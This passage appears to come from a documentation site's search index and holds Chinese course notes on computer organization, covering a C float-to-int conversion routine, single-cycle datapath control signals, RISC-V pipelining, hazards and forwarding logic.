\u4f4d\u6574\u578b\u8303\u56f4\uff0c\u8fd4\u56de\u6700\u5927\u503c\u6216\u6700\u5c0f\u503c\n        return sign ? 0x80000000 : 0x7FFFFFFF;\n    } else if (exponent &lt; 0) {\n        // \u5c0f\u4e8e 1 \u7684\u6d6e\u70b9\u6570\uff0c\u5f3a\u5236\u8f6c\u6362\u4e3a 0\n        return 0;\n    }\n\n    // \u6839\u636e\u6307\u6570\u8ba1\u7b97\u6574\u6570\u503c\n    if (exponent &gt; 23) {\n        // \u5de6\u79fb\n        mantissa &lt;&lt;= (exponent - 23);\n    } else {\n        // \u53f3\u79fb\n        mantissa &gt;&gt;= (23 - exponent);\n    }\n\n    // \u5904\u7406\u7b26\u53f7\u4f4d\n    return sign ? -((int)mantissa) : (int)mantissa;\n}\n\nint main(int argc, char **argv) {\n    scanf(\"%f\", &amp;u.f);\n    int i = floatToInt(u.d); // i = (int) f\n    printf(\"Integer value: %d\\n\", i);\n    return 0;\n}\n</code></pre>"},{"location":"Courses/CO/Chapter4/","title":"CH 4. \u5904\u7406\u5668","text":""},{"location":"Courses/CO/Chapter4/#chapter-4-the-processor","title":"Chapter 4. The Processor","text":"<p> \u7ea6 3951 \u4e2a\u5b57  55 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 20 \u5206\u949f</p>"},{"location":"Courses/CO/Chapter4/#_1","title":"\u5355\u5468\u671f\u5904\u7406\u5668","text":"<p>\u5355\u5468\u671f\u5904\u7406\u5668\u5728\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u6267\u884c\u4e00\u4e2a\u6307\u4ee4\uff0c\u5373 CPI = 1\uff0c\u800c\u65f6\u949f\u5468\u671f\u53d6\u51b3\u4e8e\u6700\u957f\u6307\u4ee4\u7684\u6267\u884c\u65f6\u957f\u3002</p> <p>\u5728\u5904\u7406\u5668\u4e2d\uff0c\u4e00\u6761\u6307\u4ee4\u7684\u6267\u884c\u901a\u5e38\u5206\u4e3a\u56db\u5230\u4e94\u4e2a\u9636\u6bb5\uff0c\u5206\u522b\u662f\u53d6\u6307\u3001\u8bd1\u7801\u3001\u6267\u884c\u3001\u8bbf\u5b58\u3001\u5199\u56de\u3002\u5176\u4e2d\uff0c\u5bf9\u4e8e\u4efb\u4f55\u6307\u4ee4\uff0c\u524d\u4e24\u4e2a\u6b65\u9aa4\u90fd\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u800c\u540e\u51e0\u6b65\u5219\u53d6\u51b3\u4e8e\u8be5\u6307\u4ee4\u7684\u7c7b\u522b\u3002</p> <ul> <li>\u53d6\u6307\u4ee4IF\uff1a\u6839\u636e\u7a0b\u5e8f\u8ba1\u6570\u5668PC\u4e2d\u7684\u6307\u4ee4\u5730\u5740\uff0c\u4ece\u5b58\u50a8\u5668\u4e2d\u53d6\u51fa\u4e00\u6761\u6307\u4ee4\uff1b\u540c\u65f6\uff0cPC\u6839\u636e\u6307\u4ee4\u5b57\u957f\u5ea6\u81ea\u52a8\u9012\u589e\u4ea7\u751f\u4e0b\u4e00\u6761\u6307\u4ee4\u6240\u9700\u8981\u7684\u6307\u4ee4\u5730\u5740\uff08PC+4\uff09\uff0c\u4f46\u9047\u5230\u5730\u5740\u8f6c\u79fb\u6307\u4ee4\u65f6\uff0c\u63a7\u5236\u5668\u53ef\u80fd\u4f1a\u5c06\u8f6c\u79fb\u5730\u5740\u9001\u5165PC</li> <li>\u6307\u4ee4\u8bd1\u7801ID\uff1a\u5bf9\u53d6\u6307\u4ee4\u64cd\u4f5c\u4e2d\u5f97\u5230\u7684\u6307\u4ee4\u8fdb\u884c\u5206\u6790\u5e76\u8bd1\u7801\uff0c\u786e\u5b9a\u6307\u4ee4\u8981\u5b8c\u6210\u7684\u64cd\u4f5c\u5e76\u4ea7\u751f\u76f8\u5e94\u7684\u63a7\u5236\u4fe1\u53f7</li> <li>\u6307\u4ee4\u6267\u884cEXE\uff1a\u6839\u636e\u64cd\u4f5c\u63a7\u5236\u4fe1\u53f7\u6267\u884c\u6307\u4ee4\u52a8\u4f5c\uff0c\u7136\u540e\u8f6c\u79fb\u5230\u7ed3\u679c\u5199\u56de\u72b6\u6001</li> <li>\u5b58\u50a8\u5668\u8bbf\u95eeMEM\uff1a\u6240\u6709\u9700\u8981\u8bbf\u95ee\u5b58\u50a8\u5668\u7684\u64cd\u4f5c\u90fd\u5728\u8fd9\u4e00\u6b65\u9aa4\u6267\u884c\uff0c\u5305\u62ec <code>load</code> \u548c <code>store</code><ul> <li><code>beq</code> \u6307\u4ee4\u5730\u5740\u5199\u56de PC \u6b65\u9aa4\u4e5f\u5728\u8fd9\u4e2a\u9636\u6bb5\uff0c\u5c3d\u7ba1\u5b83\u5e76\u6ca1\u6709\u8bbf\u95ee\u5b58\u50a8\u5668</li> </ul> </li> <li>\u7ed3\u679c\u5199\u56deWB\uff1a\u5c06\u6267\u884c\u7684\u7ed3\u679c\u6216\u8bbf\u95ee\u5b58\u50a8\u5668\u5f97\u5230\u7684\u6570\u636e\u5199\u56de\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d</li> </ul> <p>\u4e0d\u540c\u6307\u4ee4\u7684\u4e0d\u540c\u9636\u6bb5</p> <p></p> <p>\u4e00\u4e2a\u8f83\u5b8c\u6574\u7684 Datapath with Control \u793a\u610f\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u4eec\u4e00\u5171\u5b9a\u4e49 7 \u4e2a\u63a7\u5236\u4fe1\u53f7\uff0c\u7528\u4e8e\u63a7\u5236 Datapath \u8fdb\u884c\u6b63\u786e\u7684\u6307\u4ee4\u64cd\u4f5c\uff1a</p> Signal Name Effect when =0 Effect when =1 RegWrite \u65e0 \u5c06 Write Data \u5199\u5165 Write Register ALUSrc ALU \u7b2c\u4e8c\u4e2a\u8f93\u5165\u9009\u62e9\u5bc4\u5b58\u5668\u5806\u7b2c\u4e8c\u4e2a\u8f93\u51fa ALU \u7b2c\u4e8c\u4e2a\u8f93\u5165\u9009\u62e9\u6307\u4ee4\u4e2d\u7ecf\u8fc7 sign-extention \u540e\u7684\u7acb\u5373\u6570 Branch PC = PC + 4 PC = PC + imm(\u5de6\u79fb\u4e00\u4f4d\u540e\u7684) Jump \u7531 <code>Branch</code> \u51b3\u5b9a PC PC = PC + jump address(\u5de6\u79fb\u4e00\u4f4d\u540e\u7684) MemRead \u65e0 \u8bfb\u53d6\u5b58\u50a8\u5668\u5bf9\u5e94\u5730\u5740\u4e0a\u7684\u6570\u636e MemWrite \u65e0 \u5199\u5165\u5b58\u50a8\u5668\u5bf9\u5e94\u5730\u5740\u4e0a\u7684\u6570\u636e MemtoReg(2 bits) 00\uff1a\u5bc4\u5b58\u5668\u5806\u7684 Write data \u4e3a ALU \u7684\u8f93\u51fa 01\uff1a\u5bc4\u5b58\u5668\u5806\u7684 Write data \u4e3a Memory \u7684\u8f93\u51fa 10\uff1a\u5bc4\u5b58\u5668\u5806\u7684 Write data \u4e3a PC + 4(Only for <code>jal,jalr</code>) 11\uff1a\u5bc4\u5b58\u5668\u5806\u7684 Write data \u4e3a imme\uff08Only for <code>lui</code>\uff09 <p>Note</p> <p>\u5176\u5b9e\u63a7\u5236\u4fe1\u53f7 <code>Jump</code> \u4e5f\u662f 2bit \u7684\uff0c\u56e0\u4e3a\u8fd8\u9700\u8981\u652f\u6301\u6307\u4ee4 <code>jalr</code> \u7684\u8df3\u8f6c\u76ee\u6807\u5730\u5740 <code>rs1+imm</code></p> <p>\u6ce8\u610f\u5230\u4e0a\u9762\u793a\u610f\u4e2d\u63a7\u5236\u5355\u5143\u7684\u8f93\u51fa\u8fd8\u6709\u4e00\u4e2a 2bit \u7684 <code>ALUop</code> \uff0c\u8fd9\u5176\u5b9e\u662f\u63a7\u5236\u5355\u5143\u7684\u4e00\u4e2a\u4e2d\u95f4\u8f93\u51fa\uff0c\u7b2c\u4e00\u5c42\u5bf9 <code>opcode</code> \u8fdb\u884c\u8bd1\u7801\uff0c\u53ef\u4ee5\u5f97\u5230\u8be5\u6307\u4ee4\u5bf9\u5e94\u7684 <code>type</code> \u53ca\u5927\u90e8\u5206\u63a7\u5236\u4fe1\u53f7\uff1b\u7b2c\u4e8c\u5c42\u518d\u8054\u5408 <code>Funct3,Funct7,ALUop</code>\uff0c\u8bd1\u7801\u5f97\u51fa\u5bf9\u5e94\u7684 <code>ALU operation</code> \u4fe1\u53f7\uff0c\u4ee5\u63a7\u5236 ALU \u8fdb\u884c\u4f55\u79cd\u8ba1\u7b97\u3002</p> <p></p> <p>\u4e0d\u8fc7\u5bf9\u4e8e <code>ALU_Operation</code> \u6700\u7ec8\u8bd1\u7801\u51fa\u6765\u7684\u7ed3\u679c\uff0c\u8bfe\u672c\u548c\u8bfe\u4ef6\u7565\u6709\u5dee\u5f02\uff0c\u5177\u4f53\u9009\u54ea\u4e2a\u6211\u4e5f\u4e0d\u77e5\u9053\uff1a</p> ALU Control Function 0000 AND 0001 OR 0010 Add 0110 Subtract 0111 Set Less Than 1100 NOR ALU Control Function 000 AND 001 OR 010 Add 110 Subtract 111 Set Less Than 100 NOR 101 SRL 011 XOR <p>\u5bf9\u4e8e\u4e00\u822c\u7684\u6307\u4ee4\uff0c\u6709\u8868\u683c\u5982\u4e0b\uff1a</p> <p></p> \u67d0lab\u4e2d\u6211\u81ea\u5df1\u8bbe\u5b9a\u7684\u63a7\u5236\u4fe1\u53f7\u8868\uff0c\u4f46\u662f\u548c\u7406\u8bba\u8bfe\u7565\u6709\u4e0d\u540c\uff0c\u6ca1\u6709\u592a\u5927\u53c2\u8003\u4ef7\u503c <p></p> <p>\u5176\u4e2d ALUop \u4e0d\u9700\u8981\u6b7b\u8bb0\u786c\u80cc\uff0c\u53ea\u8981\u77e5\u9053\u5176\u6700\u7ec8\u5bf9\u5e94\u7684 ALU Function \u662f\u4ec0\u4e48\u5c31\u591f\u4e86\uff0c\u5982\uff1a</p> <ul> <li><code>ld</code> \u5bf9\u5e94 <code>add</code> \uff0c\u56e0\u4e3a\u9700\u8981\u5c06\u5bc4\u5b58\u5668\u4e0e\u7acb\u5373\u6570\u76f8\u52a0</li> <li><code>sd</code> \u5bf9\u5e94 <code>add</code> \uff0c\u540c <code>ld</code> \u76f8\u540c\uff0c\u9700\u8981\u5bc4\u5b58\u5668\u4e0e\u7acb\u5373\u6570\u76f8\u52a0</li> <li><code>beq</code> \u5bf9\u5e94 <code>sub</code> \uff0c\u56e0\u4e3a\u9700\u8981\u5c06\u4e24\u4e2a\u5bc4\u5b58\u5668\u76f8\u51cf\u4ee5\u5224\u65ad\u662f\u5426\u76f8\u7b49</li> <li>\u5bf9\u4e8e <code>R-type</code> \u6307\u4ee4\uff0c\u5728\u7b2c\u4e8c\u5c42\u8bd1\u7801\u5668\u6839\u636e <code>ALUop</code>,<code>Fun3</code>,<code>Fun7</code> \u6765\u5224\u65ad ALU \u6267\u884c\u7684\u64cd\u4f5c</li> </ul> <p>\u5b9e\u9645\u7684\u6570\u636e\u4f20\u8f93\u4f8b\u5b50\uff0c\u8bf7\u770b\u8bfe\u4ef6\u6216\u662f \u54b8\u9c7c\u6684\u7684\u7b14\u8bb0</p> <p>\u8bfe\u4ef6\u4e0a\u7684\u6570\u636e\u4f20\u8f93\u4f8b\u5b50\uff08\u6709\u70b9\u4e11\u8bf4\u662f\uff09</p> R-typeloadstorebeqjal <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u8003\u8bd5\u53ef\u80fd\u7684\u9898\u578b</p> S &amp; ROnly S-type <p></p> <p></p>"},{"location":"Courses/CO/Chapter4/#_2","title":"\u6d41\u6c34\u7ebf","text":""},{"location":"Courses/CO/Chapter4/#overview","title":"Overview","text":"<p>\u5047\u5b9a CPU \u5bf9\u4e8e\u4e0b\u5217\u64cd\u4f5c\u6d88\u8017\u65f6\u95f4\u5982\u4e0b\uff1a</p> <p></p> <p>\u90a3\u4e48\uff0c\u5bf9\u4e8e\u5404\u79cd\u4e0d\u540c\u7684\u6307\u4ee4\uff0c\u5b83\u4eec\u5404\u81ea\u6267\u884c\u5b8c\u6240\u9700\u8981\u7684\u603b\u65f6\u95f4\u4e3a:</p> <p></p> <p>Latancy: \u6bcf\u4e00\u6761\u6307\u4ee4\u6267\u884c\u9700\u8981\u7684\u65f6\u95f4</p> <p>\u5bf9\u4e8e\u5355\u5468\u671f\u5904\u7406\u5668\uff0c\u6700\u957f\u7684\u65f6\u949f\u5ef6\u8fdf\u51b3\u5b9a\u4e86\u5904\u7406\u5668\u7684\u65f6\u949f\u9891\u7387\uff0c\u4f46\u662f\u6700\u8017\u65f6\u6307\u4ee4\u4e0d\u4e00\u5b9a\u662f\u6700\u5e38\u7528\u7684\u6307\u4ee4\uff0c\u8fd9\u8fdd\u80cc\u4e86\u516b\u5927\u601d\u60f3\u7684 Making common case fast \u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u5f15\u5165 pipeline \u4ee5\u63d0\u5347\u5904\u7406\u5668\u7684\u6027\u80fd\u3002</p> <ol> <li>IF: Instruction fetch from memory</li> <li>ID: Instruction decode &amp; register read</li> <li>EX: Execute operation or calculate address</li> <li>MEM: Access memory operand</li> <li>WB: Write result back to register</li> </ol> <p>\u5904\u7406\u5668\u6267\u884c\u4e00\u6761\u6307\u4ee4\u5171\u6709\u4e94\u4e2a\u9636\u6bb5\uff0c\u5728\u6d41\u6c34\u7ebf\u4e2d\uff0c\u6bcf\u4e2a\u9636\u6bb5\u5bf9\u5e94\u4e00\u4e2a\u72b6\u6001\uff0c\u4e3a\u4e86\u66f4\u9ad8\u6548\u5229\u7528\u5904\u7406\u5668\uff0c\u5728\u4efb\u4e00\u65f6\u949f\u5468\u671f\u6211\u4eec\u671f\u671b\u6bcf\u4e2a\u9636\u6bb5\u90fd\u6709\u6307\u4ee4\u6b63\u5728\u6267\u884c\uff0c\u5f62\u6210\u7406\u60f3\u6d41\u6c34\u7ebf\u5982\u4e0b\uff1a</p> <p></p> <p>\u800c\u65f6\u949f\u5468\u671f\u7531\u6700\u957f\u65f6\u949f\u5ef6\u8fdf\u7684\u9636\u6bb5\u51b3\u5b9a\u3002</p> <p>CPI \u4ece 1 \u53d8\u6210\u4e86 5 !</p> <p>\u4ecd\u7136\u4f7f\u7528\u4e0a\u8ff0\u5404\u79cd\u64cd\u4f5c\u8017\u8d39\u65f6\u95f4\uff0c\u4e0b\u56fe\u5bf9\u6bd4\u5355\u5468\u671f\u5904\u7406\u5668\u548c\u6d41\u6c34\u7ebf\u5904\u7406\u5668\u6d41\u7a0b\u56fe\uff1a</p> <p></p> <p>\u53ef\u89c1\uff0c\u5404\u4e2a\u9636\u6bb5\u8017\u65f6\u8d8a\u5e73\u8861\uff0c\u6d41\u6c34\u7ebf\u7684\u6027\u80fd\u63d0\u5347\u8d8a\u5927\u3002</p> <p>RISC-V \u6307\u4ee4\u96c6\u8f83\u65b9\u4fbf\u8fdb\u884c\u6d41\u6c34\u7ebf\u8bbe\u8ba1\uff1a</p> <ul> <li>All instruction are 32-bits<ul> <li>\u66f4\u65b9\u4fbf fetch \u548c decode \u7684\u8fd0\u4f5c</li> </ul> </li> <li>\u6307\u4ee4\u683c\u5f0f\u66f4\u5c11\uff0c\u4e5f\u66f4\u89c4\u5f8b<ul> <li>\u66f4\u65b9\u4fbf decode \u548c read register</li> </ul> </li> <li>\u53ea\u5728 load \u6216 store \u6307\u4ee4\u4e2d\u64cd\u4f5c data memory \u800c\u4e0d\u4f1a\u5c06\u5b58\u53d6\u7684\u7ed3\u679c\u505a\u8fdb\u4e00\u6b65\u8fd0\u7b97\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5c06\u00a0<code>MEM</code>\u00a0\u653e\u5728\u6bd4\u8f83\u540e\u9762\u7684\u4f4d\u7f6e\uff1b\u5982\u679c\u8fd8\u80fd\u5bf9\u7ed3\u679c\u505a\u8fd0\u7b97\u5219\u8fd8\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u9636\u6bb5\uff0c\u6b64\u65f6\u6d41\u6c34\u7ebf\u7684\u53d8\u957f\u5e76\u6ca1\u6709\u4ec0\u4e48\u6b63\u9762\u6548\u679c</li> </ul> <p>\u5bf9\u4e8e\u6d41\u6c34\u7ebf\uff0c\u6307\u4ee4\u7684 Latancy \u5e76\u6ca1\u6709\u63d0\u5347</p>"},{"location":"Courses/CO/Chapter4/#hazards","title":"Hazards","text":"<p>Hazards(\u5192\u9669)\u662f\u963b\u6b62\u6307\u4ee4\u8fdb\u5165\u4e0b\u4e00\u9636\u6bb5\u7684\u60c5\u51b5\uff0c\u53ef\u5206\u4e3a\uff1a</p> <ul> <li>Structure Hazards \u7ed3\u6784\u5192\u9669<ul> <li>A required resource is busy</li> <li>\u786c\u4ef6\u4e0d\u652f\u6301\u591a\u6761\u6307\u4ee4\u5728\u540c\u4e00\u65f6\u949f\u5468\u671f\u6267\u884c</li> </ul> </li> <li>Data Hazards \u6570\u636e\u5192\u9669<ul> <li>Need to wait for previous instruction to complete its data read/write</li> <li>\u5f53\u524d\u6307\u4ee4\u7684\u6267\u884c\u9700\u8981\u7b49\u5f85\u524d\u9762\u6307\u4ee4\u7684\u6570\u636e\u7ed3\u679c</li> </ul> </li> <li>Control Hazards \u63a7\u5236\u5192\u9669<ul> <li>Deciding on control action depends on previous instruction</li> <li>\u6307\u4ee4\u975e\u987a\u5e8f\u6267\u884c\u800c\u5bfc\u81f4\u4e0b\u4e00\u6761\u6267\u884c\u7684\u6307\u4ee4\u4e0d\u662f\u771f\u5b9e\u671f\u671b\u7684</li> </ul> </li> </ul>"},{"location":"Courses/CO/Chapter4/#structure-hazards","title":"Structure Hazards","text":"<p>\u7531\u4e8e\u4e0d\u540c\u6307\u4ee4\u7684\u5404\u4e2a\u9636\u6bb5\u5f88\u53ef\u80fd\u5728\u5904\u7406\u5668\u4e2d\u540c\u65f6\u6267\u884c\uff0c\u4f1a\u9047\u5230\u5904\u7406\u5668\u540c\u65f6\u8bfb\u5199\u5bc4\u5b58\u5668\u6216Memory!?\u8fd9\u663e\u7136\u662f\u4e0d\u88ab\u5141\u8bb8\u7684\uff0c\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u77db\u76fe\uff0c\u5728\u5b9e\u9645\u7684\u6d41\u6c34\u7ebf\u5b9e\u73b0\u4e2d\u6211\u4eec\u9700\u8981\u4e0d\u540c\u9636\u6bb5\u4e4b\u95f4\u52a0\u4e0a pipeline register \u6765\u4fdd\u5b58\u4e0a\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u7684\u6570\u636e\u3002</p> <p>\u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\u548c PC \u4e00\u6837\uff0c\u90fd\u5728\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u4e0b\u964d\u6cbf\u5199\u5165\u6570\u636e</p> <p></p> <p>\u5bf9\u4e8e <code>load</code> \u6307\u4ee4\uff0c\u5b83\u7684 single-clock-cycle \u7684\u6570\u636e\u901a\u8def\u56fe\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> IFIDEXMEMWB <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u8fd9\u91cc\u5bf9 Datapath \u4fee\u6b63\u5728\u4e8e <code>WriteRegister</code> \u8981\u4ece <code>MEM/WB</code> \u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\u4e2d\u8bfb\u53d6 </p> <p>\u6700\u7ec8\u5f97\u5230\u7684\u7b80\u5316\u7684 Pipeline with control \u7684 Datapath \u5982\u56fe\uff1a</p> <p></p> <p>\u5f53\u5904\u7406\u5668\u9700\u8981\u63d2\u5165 Bubble \u65f6\uff0c\u5c06\u6240\u6709\u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\u7684\u63a7\u5236\u4fe1\u53f7\u5168\u90e8\u7f6e 0\uff0c\u5e76\u963b\u6b62 PC \u548c <code>IF/ID</code> \u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\u7684\u66f4\u65b0\u3002</p> <p>\u786c\u4ef6\u8d44\u6e90\u51b2\u7a81</p> <p>\u6d41\u6c34\u7ebf\u6267\u884c\u671f\u95f4\uff0c\u4e5f\u53ef\u80fd\u53d1\u751f\u4e24\u6761\u53ca\u4ee5\u4e0a\u7684\u6307\u4ee4\u540c\u65f6\u5bf9Memory\u53d1\u8d77\u8d44\u6e90\u8bf7\u6c42\uff0c\u89e3\u51b3\u65b9\u6cd5\u662f\u5c06\u6307\u4ee4\u548c\u6570\u636e\u5206\u79bb\u5b58\u50a8\uff0c\u8fd9\u6837\u53d6\u6307\u9636\u6bb5\u53ea\u4f7f\u7528 IMEM \uff0c\u8bbf\u5b58\u9636\u6bb5\u53ea\u4f7f\u7528 DMEM\u3002</p>"},{"location":"Courses/CO/Chapter4/#data-hazards","title":"Data Hazards","text":"<p>\u5f53\u4e24\u4e2a\u6307\u4ee4\u6240\u7528\u5230\u7684\u6570\u636e\u6709\u5148\u540e\u8981\u6c42\u65f6\uff0c\u4f1a\u53d1\u751f\u6570\u636e\u5192\u9669\u3002</p> <p>RAW (Read After Write)</p> <ul> <li>\u6307\u4ee41\u4e3a\u8bfb\uff0c\u6307\u4ee42\u4e3a\u5199\uff0c\u53ea\u53ef\u80fd\u53d1\u751f WAR \u76f8\u5173</li> <li>\u6307\u4ee41\u4e3a\u5199\uff0c\u6307\u4ee42\u4e3a\u8bfb\uff0c\u53ea\u53ef\u80fd\u53d1\u751f RAW \u76f8\u5173</li> <li>\u6307\u4ee41\u4e3a\u5199\uff0c\u6307\u4ee42\u4e3a\u5199\uff0c\u53ea\u53ef\u80fd\u53d1\u751f WAW \u76f8\u5173</li> </ul> <p>\u5bf9\u4e8e RISC-V \u6d41\u6c34\u7ebf\u6309\u5e8f\u6267\u884c\u524d\u63d0\u4e0b\uff0c\u53ea\u53ef\u80fd\u53d1\u751f RAW\uff0c\u4ea6\u5373\u63a5\u4e0b\u6765\u63a2\u7a76\u7684 Data Hazards\uff0c\u5176\u610f\u4e3a\u6307\u4ee42\u7684\u8bfb\u53d6\u64cd\u4f5c\u53d1\u751f\u5728\u6307\u4ee41\u7684\u5199\u56de\u64cd\u4f5c\u4e4b\u524d\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u77db\u76fe\uff0c\u540e\u6765\u7684\u6307\u4ee4\u8981\u5148\u7b49\u5230\u4e0a\u4e00\u6761\u6307\u4ee4\u7684\u8fd0\u7b97\u7ed3\u679c\u5199\u56de\u5230\u5bc4\u5b58\u5668\u6216\u662fMemory\u4e2d\uff0c\u624d\u53ef\u4ee5\u7ee7\u7eed\u8bd1\u7801\u3002\u90a3\u4e48\uff0c\u540e\u6765\u7684\u6307\u4ee4\u7684 IF \u9636\u6bb5\u9700\u8981 Stall \uff0c\u7b49\u5f85\u671f\u95f4\u5904\u7406\u5668\u6d41\u6c34\u7ebf\u4f1a\u63d2\u5165 Bubble \u6765\u4ee3\u66ff\u7a7a\u6307\u4ee4\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4e0b\u9762\u4e24\u6761\u8fde\u7eed\u6307\u4ee4\uff0c\u5b83\u4eec\u4e00\u4e2a\u9700\u8981\u5199\u56de x19\uff0c\u4e00\u4e2a\u9700\u8981\u8bfb\u53d6 x19\uff0c\u6ca1\u6709\u4f18\u5316\u7684\u5904\u7406\u5668\u4e2d\u95f4\u9700\u8981\u63d2\u5165\u4e24\u8f6e Bubble \uff0c\u76f4\u5230\u4e0a\u4e00\u6761\u6307\u4ee4\u7684 WB \u7ed3\u675f\uff0c\u4e0b\u4e00\u6761\u6307\u4ee4\u624d\u80fd\u8fdb\u5165 EXE \u9636\u6bb5\uff1a</p> <pre><code>add x19, x0, x1\nsub x2, x19, x3\n</code></pre> <p></p> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\u4e0b\u4e00\u6761\u6307\u4ee4\u6267\u884c\u5b8c IF \u9636\u6bb5\u540e\u88ab\u8feb Stall \u4e86\u4e24\u4e2a\u5468\u671f\uff0c\u6d41\u6c34\u7ebf\u56fe\u4e0e\u4e0a\u56fe\u7565\u6709\u5dee\u522b</p> <p>\u5f53\u7136\uff0c\u5982\u679c Datapath \u6709\u989d\u5916\u7684\u6570\u636e\u901a\u8def\uff0c\u5904\u7406\u5668\u4e5f\u5141\u8bb8\u4e2d\u95f4\u6570\u636e\u8fdb\u5165 WB \u9636\u6bb5\u4e4b\u524d\uff0c\u76f4\u63a5\u4f20\u8f93\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\u7684 EX \u9636\u6bb5\uff0c\u8fd9\u79cd\u4f18\u5316\u540d\u4e3a Forwarding (or Bypassing)\uff1a</p> <p></p> <p>\u4ece Memory \u8bfb\u53d6\u7684\u6570\u636e\u76f4\u63a5\u4f20\u5165\u4e0b\u4e00\u6307\u4ee4 EX \u9636\u6bb5(Load-use Hazard)</p> <p> load \u578b\u6307\u4ee4\u5373\u4fbf\u4f7f\u7528 Forwarding \u4e5f\u8981\u63d2\u5165\u4e00\u4e2a Bubble\u3002</p> <p>\u5e78\u8fd0\u7684\u662f\uff0c\u4e0b\u4e00\u6761\u6307\u4ee4\u5728 Stall \u524d\u5e76\u6ca1\u6709\u5bf9\u5bc4\u5b58\u5668\u5806\u6216 MEM \u4f5c\u51fa\u4efb\u4f55\u64cd\u4f5c\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u7528 NOP \u6307\u4ee4\u53d6\u4ee3\u5b83\u540e\u9762\u7684\u9636\u6bb5\u3002</p> <p>\u5bf9\u4e8e\u4f7f\u7528 Forwarding \u4f18\u5316\u7684\u5904\u7406\u5668\uff0c\u6267\u884c\u4e0b\u5217\u6307\u4ee4\u8fc7\u7a0b\u4e2d\u4f1a\u53d1\u751f\u4e24\u4e2a\u6570\u636e\u5192\u9669\uff0c\u5bfc\u81f4\u603b\u8fd0\u884c\u65f6\u95f4\u4f1a\u589e\u52a0\u4e24\u4e2a\u65f6\u949f\u5468\u671f\uff1a</p> <pre><code>ld x1, 0(x0)\nld x2, 8(x0)\nadd x3, x1, x2 ; stall happened\nsd x3, 24(x0)\nld x4, 16(x0)\nadd x5, x1, x4 ; stall happened\nsd x5, 32(x0)\n\n;Need 7+4+2 = 13 cycles if using forwarding\n</code></pre> <p>\u6211\u4eec\u5728\u5199\u6c47\u7f16\u4ee3\u7801\u65f6\uff0c\u5c06\u4e24\u4e2a <code>ld</code> \u6307\u4ee4\u63d0\u524d\uff0c\u80fd\u591f\u4f7f\u786c\u4ef6\u6709\u66f4\u5feb\u7684\u8fd0\u884c\u901f\u5ea6\uff1a</p> <pre><code>ld x1, 0(x0)\nld x2, 8(x0)\nld x4, 16(x0)\nadd x3, x1, x2 ; stall happened\nsd x3, 24(x0)\nadd x5, x1, x4 ; stall happened\nsd x5, 32(x0)\n</code></pre> <p>\u6211\u4eec\u4f7f\u7528\u7f16\u8bd1\u5668\u65f6\uff0c\u6c47\u7f16\u5668\u4e00\u822c\u4f1a\u81ea\u52a8\u4f18\u5316\u6392\u5217</p> <p>\u90a3\u4e48\u6211\u4eec\u6709\u4e2a\u95ee\u9898\uff0c\u5728\u786c\u4ef6\u5c42\u9762\u4e0a\uff0c\u5904\u7406\u5668\u5982\u4f55\u5224\u65ad\u9700\u8981\u8fdb\u884c Forward \u64cd\u4f5c\uff1f</p> <p>\u6211\u4eec\u53ef\u4ee5\u628a\u9700\u8981 Forward \u7684\u60c5\u51b5\u5206\u4e3a\u4e09\u79cd\uff1a</p> <ul> <li>EX Hazard<ul> <li>\u4e0b\u4e00\u6761\u6307\u4ee4\u9700\u8981\u7528\u5230\u5f53\u524d\u6307\u4ee4\u7684\u8fd0\u7b97\u7ed3\u679c\u5bc4\u5b58\u5668</li> <li>\u6b64\u65f6 ALU \u7684\u4e00\u4e2a\u8f93\u5165\u4ece <code>EX/MEM</code> \u4e2d\u8f6c\u63a5</li> </ul> </li> <li>MEM Hazard<ul> <li>\u4e0b\u4e0b\u6761\u6307\u4ee4\u9700\u8981\u7528\u5230\u5f53\u524d\u6307\u4ee4\u7684\u8fd0\u7b97\u7ed3\u679c\u5bc4\u5b58\u5668</li> <li>\u6b64\u65f6 ALU \u7684\u4e00\u4e2a\u8f93\u5165\u4ece <code>MEM/WB</code> \u4e2d\u8f6c\u63a5</li> </ul> </li> <li>Load-use Hazard<ul> <li>\u5f53\u524d\u6307\u4ee4\u4e3a <code>load</code> \uff0c\u4e14\u4e0b\u4e00\u6761\u6307\u4ee4\u9700\u8981\u7528\u5230\u5176 <code>load</code> \u8bfb\u53d6\u7684\u6570\u636e</li> </ul> </li> </ul> <p>EX Hazard:</p> <pre><code>if(EX/MEM.RegWrite\n  and (EX/MEM.RegisterRd != 0)\n  and (EX/MEM.RegisiterRd == ID/EX.RegisterRs1))\n  ForwardA = 10;\nif(EX/MEM.RegWrite\n  and (EX/MEM.RegisterRd != 0)\n  and (EX/MEM.RegisiterRd == ID/EX.RegisterRs2))\n  ForwardB = 10;\n</code></pre> <p>MEM Hazard:</p> <pre><code>if(MEM/WB.RegWrite\n  and (MEM/WB.RegisterRd != 0)\n  and not[EX/MEM.RegWrite and (EX/MEM.RegisterRd != 0)\n      and (EX/MEM.RegisterRd == ID/EX.RegisterRs1)] // \u6ca1\u53d1\u751f EX Hazard\n  and (MEM/WB.RegisterRd == ID/EX.RegisterRs1))\n  ForwardA = 01;\nif(MEM/WB.RegWrite\n  and (MEM/WB.RegisterRd != 0)\n  and not[EX/MEM.RegWrite and (EX/MEM.RegisterRd != 0)\n      and (EX/MEM.RegisterRd == 